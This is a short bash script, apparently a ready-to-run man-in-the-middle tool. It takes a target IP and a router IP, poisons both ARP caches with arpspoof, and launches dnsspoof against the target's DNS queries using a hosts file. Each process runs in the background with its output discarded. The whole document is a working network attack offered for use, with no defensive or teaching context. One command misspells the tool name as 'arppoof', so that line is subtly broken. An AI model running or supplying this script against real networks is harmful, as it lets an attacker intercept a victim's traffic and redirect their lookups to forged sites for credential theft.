#! /bin/bash

if [ -z $1 -o -z $2 ]; then
   echo "Usage:  ManInTheMiddle <target ip> <router ip>"
   exit 0
fi
/usr/sbin/arpspoof -t $1 $2 > /dev/null  &
/usr/sbin/arppoof -t $2 $1 > /dev/null &
/usr/sbin/dnsspoof -f ./dnsspoof.hosts "udp dst 53 and src $1" > /dev/null &
